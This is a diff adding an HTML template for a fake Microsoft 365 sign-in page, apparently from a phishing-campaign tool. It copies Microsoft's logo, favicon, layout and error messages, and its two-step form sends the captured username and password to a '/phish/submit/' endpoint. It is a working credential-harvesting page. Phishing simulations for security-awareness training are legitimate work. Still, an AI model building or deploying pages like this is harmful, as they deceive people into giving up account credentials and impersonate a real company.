@@ -1,0 +1,429 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in to your account</title>
+    <link rel="icon" href="https://logincdn.msauth.net/shared/1.0/content/images/favicon_a3.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', 'Helvetica Neue', Helvetica, Arial, sans-serif;
+            background: #f3f2f1;
+            color: #323130;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        .header {
+            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid #edebe9;
+        }
+        
+        .microsoft-logo {
+            display: flex;
+            align-items: center;
+            font-size: 21px;
+            font-weight: 600;
+            color: #5a5a5a;
+        }
+        
+        .logo-squares {
+            margin-right: 8px;
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-gap: 1px;
+            width: 23px;
+            height: 23px;
+        }
+        
+        .logo-square {
+            width: 11px;
+            height: 11px;
+        }
+        
+        .logo-square:nth-child(1) { background: #f25022; }
+        .logo-square:nth-child(2) { background: #7fba00; }
+        .logo-square:nth-child(3) { background: #00a4ef; }
+        .logo-square:nth-child(4) { background: #ffb900; }
+        
+        .main-content {
+            flex: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        
+        .login-container {
+            background: white;
+            border-radius: 2px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            width: 100%;
+            max-width: 440px;
+            padding: 44px;
+        }
+        
+        .login-header {
+            text-align: left;
+            margin-bottom: 24px;
+        }
+        
+        .login-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #323130;
+            margin-bottom: 8px;
+        }
+        
+        .login-subtitle {
+            font-size: 15px;
+            color: #605e5c;
+        }
+        
+        .form-group {
+            margin-bottom: 16px;
+        }
+        
+        .form-label {
+            display: block;
+            font-size: 15px;
+            color: #323130;
+            margin-bottom: 8px;
+            font-weight: 600;
+        }
+        
+        .form-input {
+            width: 100%;
+            padding: 8px 12px;
+            border: 1px solid #605e5c;
+            border-radius: 2px;
+            font-size: 15px;
+            background: white;
+            color: #323130;
+            transition: border-color 0.2s;
+        }
+        
+        .form-input:focus {
+            outline: none;
+            border-color: #0078d4;
+            border-width: 2px;
+            padding: 7px 11px;
+        }
+        
+        .form-input.error {
+            border-color: #d13438;
+        }
+        
+        .error-message {
+            color: #d13438;
+            font-size: 13px;
+            margin-top: 4px;
+            display: none;
+        }
+        
+        .form-options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 24px;
+            font-size: 13px;
+        }
+        
+        .checkbox-container {
+            display: flex;
+            align-items: center;
+        }
+        
+        .checkbox-container input[type="checkbox"] {
+            margin-right: 8px;
+        }
+        
+        .forgot-password {
+            color: #0067b8;
+            text-decoration: none;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        .sign-in-options {
+            margin-bottom: 24px;
+        }
+        
+        .sign-in-option {
+            display: flex;
+            align-items: center;
+            padding: 8px 12px;
+            border: 1px solid #8a8886;
+            border-radius: 2px;
+            background: white;
+            color: #323130;
+            text-decoration: none;
+            margin-bottom: 8px;
+            transition: background-color 0.2s;
+        }
+        
+        .sign-in-option:hover {
+            background: #f3f2f1;
+            text-decoration: none;
+            color: #323130;
+        }
+        
+        .sign-in-option-icon {
+            width: 18px;
+            height: 18px;
+            margin-right: 8px;
+        }
+        
+        .form-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .back-button {
+            background: none;
+            border: none;
+            color: #0067b8;
+            font-size: 15px;
+            cursor: pointer;
+            text-decoration: none;
+        }
+        
+        .back-button:hover {
+            text-decoration: underline;
+        }
+        
+        .next-button {
+            background: #0067b8;
+            color: white;
+            border: none;
+            padding: 8px 20px;
+            border-radius: 2px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+            min-width: 108px;
+        }
+        
+        .next-button:hover {
+            background: #106ebe;
+        }
+        
+        .next-button:disabled {
+            background: #a19f9d;
+            cursor: not-allowed;
+        }
+        
+        .footer-links {
+            text-align: center;
+            margin-top: 36px;
+            font-size: 13px;
+        }
+        
+        .footer-links a {
+            color: #605e5c;
+            text-decoration: none;
+            margin: 0 8px;
+        }
+        
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+        
+        .step-indicator {
+            text-align: right;
+            margin-bottom: 24px;
+            font-size: 13px;
+            color: #605e5c;
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 24px;
+                margin: 0;
+                border-radius: 0;
+                box-shadow: none;
+                min-height: calc(100vh - 60px);
+            }
+            
+            .header {
+                padding: 12px 16px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="microsoft-logo">
+            <div class="logo-squares">
+                <div class="logo-square"></div>
+                <div class="logo-square"></div>
+                <div class="logo-square"></div>
+                <div class="logo-square"></div>
+            </div>
+            Microsoft
+        </div>
+    </div>
+    
+    <div class="main-content">
+        <div class="login-container">
+            <!-- Email Step -->
+            <div id="emailStep">
+                <div class="login-header">
+                    <h1 class="login-title">Sign in</h1>
+                    <p class="login-subtitle">to continue to Microsoft 365</p>
+                </div>
+                
+                <form id="emailForm">
+                    <div class="form-group">
+                        <label for="email" class="form-label">Email, phone, or Skype</label>
+                        <input type="text" id="email" name="username" class="form-input" required>
+                        <div class="error-message" id="emailError">This username may be incorrect. Make sure you typed it correctly.</div>
+                    </div>
+                    
+                    <div class="form-options">
+                        <div style="font-size: 13px;">
+                            No account? <a href="#" style="color: #0067b8;">Create one!</a>
+                        </div>
+                        <a href="#" class="forgot-password">Can't access your account?</a>
+                    </div>
+                    
+                    <div class="sign-in-options">
+                        <a href="#" class="sign-in-option">
+                            <svg class="sign-in-option-icon" viewBox="0 0 18 18">
+                                <path fill="#0067b8" d="M17.3 9.2c0-.8-.1-1.6-.2-2.4H9v4.5h4.7c-.2 1.1-.8 2-1.7 2.6v2.2h2.7c1.6-1.5 2.6-3.7 2.6-6.9z"/>
+                                <path fill="#34a853" d="M9 18c2.3 0 4.3-.8 5.7-2.1l-2.7-2.2c-.8.5-1.8.8-3 .8-2.3 0-4.2-1.5-4.9-3.6H1.3v2.3C2.7 15.8 5.6 18 9 18z"/>
+                                <path fill="#fbbc04" d="M4.1 10.9c-.2-.5-.2-1.1-.2-1.7s.1-1.2.2-1.7V5.2H1.3C.5 6.7 0 7.8 0 9.2s.5 2.5 1.3 4l2.8-2.3z"/>
+                                <path fill="#ea4335" d="M9 3.6c1.3 0 2.5.4 3.4 1.3l2.5-2.5C13.3.7 11.3 0 9 0 5.6 0 2.7 2.2 1.3 5.2l2.8 2.3C4.8 5.1 6.7 3.6 9 3.6z"/>
+                            </svg>
+                            Sign in with Google
+                        </a>
+                    </div>
+                    
+                    <div class="form-actions">
+                        <button type="button" class="back-button">Back</button>
+                        <button type="submit" class="next-button">Next</button>
+                    </div>
+                </form>
+                
+                <div class="footer-links">
+                    <a href="#">Terms of use</a>
+                    <a href="#">Privacy & cookies</a>
+                    <a href="#">...</a>
+                </div>
+            </div>
+            
+            <!-- Password Step -->
+            <div id="passwordStep" style="display: none;">
+                <div class="step-indicator">1 of 2</div>
+                
+                <div class="login-header">
+                    <h1 class="login-title">Enter password</h1>
+                    <div style="margin-top: 8px;">
+                        <span id="userEmail" style="font-size: 15px; color: #323130;"></span>
+                    </div>
+                </div>
+                
+                <form method="POST" action="/phish/submit/{{ campaign.id if campaign else '' }}" id="passwordForm">
+                    <input type="hidden" name="username" id="hiddenUsername">
+                    
+                    <div class="form-group">
+                        <label for="password" class="form-label">Password</label>
+                        <input type="password" id="password" name="password" class="form-input" required>
+                        <div class="error-message" id="passwordError">Your account or password is incorrect.</div>
+                    </div>
+                    
+                    <div class="form-options">
+                        <div class="checkbox-container">
+                            <input type="checkbox" id="staySignedIn">
+                            <label for="staySignedIn">Keep me signed in</label>
+                        </div>
+                        <a href="#" class="forgot-password">Forgot password?</a>
+                    </div>
+                    
+                    <div class="form-actions">
+                        <button type="button" class="back-button" onclick="goBack()">Back</button>
+                        <button type="submit" class="next-button">Sign in</button>
+                    </div>
+                </form>
+                
+                <div class="footer-links">
+                    <a href="#">Terms of use</a>
+                    <a href="#">Privacy & cookies</a>
+                    <a href="#">...</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('emailForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            if (!email) {
+                showError('emailError');
+                return;
+            }
+            
+            // Hide email step, show password step
+            document.getElementById('emailStep').style.display = 'none';
+            document.getElementById('passwordStep').style.display = 'block';
+            
+            // Set email in password step
+            document.getElementById('userEmail').textContent = email;
+            document.getElementById('hiddenUsername').value = email;
+        });
+        
+        function goBack() {
+            document.getElementById('emailStep').style.display = 'block';
+            document.getElementById('passwordStep').style.display = 'none';
+        }
+        
+        function showError(errorId) {
+            const errorElement = document.getElementById(errorId);
+            const inputElement = errorElement.previousElementSibling;
+            
+            errorElement.style.display = 'block';
+            inputElement.classList.add('error');
+            
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+                inputElement.classList.remove('error');
+            }, 5000);
+        }
+        
+        // Real-time validation
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('.form-input');
+            
+            inputs.forEach(input => {
+                input.addEventListener('input', function() {
+                    if (this.classList.contains('error')) {
+                        this.classList.remove('error');
+                        const errorElement = this.nextElementSibling;
+                        if (errorElement && errorElement.classList.contains('error-message')) {
+                            errorElement.style.display = 'none';
+                        }
+                    }
+                });
+            });
+        });
+        
+        // Form submission tracking
+        document.getElementById('passwordForm').addEventListener('submit', function() {
+            console.log('Microsoft login form submitted');
+        });
+    </script>
+</body>
+</html>
